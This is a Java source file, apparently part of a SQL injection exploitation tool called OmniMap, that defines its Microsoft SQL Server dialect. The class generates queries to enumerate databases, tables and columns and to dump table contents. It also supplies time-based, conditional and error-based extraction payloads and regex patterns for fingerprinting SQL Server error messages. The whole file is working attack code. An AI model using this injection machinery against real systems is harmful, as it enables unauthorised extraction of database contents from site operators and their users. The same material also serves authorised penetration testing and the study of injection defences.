package com.omnistrike.modules.exploit.omnimap.dbms;

import java.util.List;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * Microsoft SQL Server dialect for OmniMap.
 * Uses INFORMATION_SCHEMA, SUBSTRING(), CHAR(), WAITFOR DELAY, IIF/CASE,
 * and CONVERT type-conversion errors for error-based extraction.
 */
public class MssqlDialect implements DbmsDialect {

    @Override
    public String getName() { return "MSSQL"; }

    @Override
    public String currentDatabase() {
        return "SELECT DB_NAME()";
    }

    @Override
    public String listDatabases() {
        return "SELECT name FROM master.dbo.sysdatabases";
    }

    @Override
    public String listTables(String database) {
        return "SELECT table_name FROM " + database + ".INFORMATION_SCHEMA.TABLES WHERE table_type='BASE TABLE'";
    }

    @Override
    public String listColumns(String database, String table) {
        return "SELECT column_name FROM " + database + ".INFORMATION_SCHEMA.COLUMNS WHERE table_name='" + table + "'";
    }

    @Override
    public String dumpData(String database, String table, List<String> columns, int offset, int limit) {
        String cols = columns.stream()
                .map(c -> "ISNULL(CAST([" + c + "] AS NVARCHAR(MAX)),CHAR(32))")
                .collect(Collectors.joining("+CHAR(124)+"));
        return "SELECT TOP " + limit + " " + cols + " FROM [" + database + "].dbo.[" + table
                + "] WHERE " + cols + " NOT IN (SELECT TOP " + offset + " " + cols
                + " FROM [" + database + "].dbo.[" + table + "])";
    }

    @Override
    public String charFunction(int ascii) {
        return "CHAR(" + ascii + ")";
    }

    @Override
    public String substringFunction(String expr, int pos, int len) {
        return "SUBSTRING((" + expr + ")," + pos + "," + len + ")";
    }

    @Override
    public String lengthFunction(String expr) {
        return "LEN((" + expr + "))";
    }

    @Override
    public String sleepFunction(int seconds) {
        return "WAITFOR DELAY '0:0:" + seconds + "'";
    }

    @Override
    public String ifFunction(String condition, String trueVal, String falseVal) {
        return "IIF(" + condition + "," + trueVal + "," + falseVal + ")";
    }

    @Override
    public String commentSuffix() {
        return "--";
    }

    @Override
    public String concatenate(String... parts) {
        return String.join("+", parts);
    }

    @Override
    public List<String> errorFunctions() {
        return List.of(
                "CONVERT(INT,(%s))",
                "CAST((%s) AS INT)",
                "(SELECT TOP 1 (%s) FROM information_schema.tables)"
        );
    }

    @Override
    public List<Pattern> errorPatterns() {
        return List.of(
                Pattern.compile("Microsoft SQL Native Client", Pattern.CASE_INSENSITIVE),
                Pattern.compile("\\bODBC SQL Server Driver\\b", Pattern.CASE_INSENSITIVE),
                Pattern.compile("\\bSQLServer\\b", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Conversion failed when converting", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Unclosed quotation mark after the character string", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Incorrect syntax near", Pattern.CASE_INSENSITIVE),
                Pattern.compile("nvarchar value '.*' to.*int", Pattern.CASE_INSENSITIVE)
        );
    }

    @Override
    public String countRows(String database, String table) {
        return "SELECT COUNT(*) FROM [" + database + "].dbo.[" + table + "]";
    }

    @Override
    public String limitOffset(String query, int limit, int offset) {
        // MSSQL 2012+: OFFSET FETCH requires ORDER BY
        return query + " ORDER BY 1 OFFSET " + offset + " ROWS FETCH NEXT " + limit + " ROWS ONLY";
    }
}
